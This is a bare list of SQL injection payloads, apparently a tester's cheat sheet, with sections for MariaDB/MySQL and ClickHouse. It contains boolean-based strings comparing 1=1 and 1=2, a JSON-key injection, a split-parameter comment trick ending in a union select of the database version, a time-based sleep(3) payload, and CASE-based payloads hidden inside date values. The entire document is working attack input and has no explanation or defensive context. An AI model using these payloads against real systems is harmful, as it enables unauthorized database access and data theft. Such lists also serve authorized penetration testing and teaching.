# SQLI PAYLOAD

# MARIADB, MYSQL
||1=1%20limit%201%20%23  
||1=2%20limit%201%20%23  
{"or 1=1 -- ":"asdf"}//딕셔너리  
"1param":"asdf%') /*", "2param":" */ union select 0,0,0,@@version,0 --a"  

# CLICK HOUSE
DESC, (select sleep(3)) -- -  
2024-0'||case when 1=1 then 5 else 0x2b end||'-10 23:30:58  
2024-0'||case when 1=2 then 5 else 0x2b end||'-10 23:30:58  
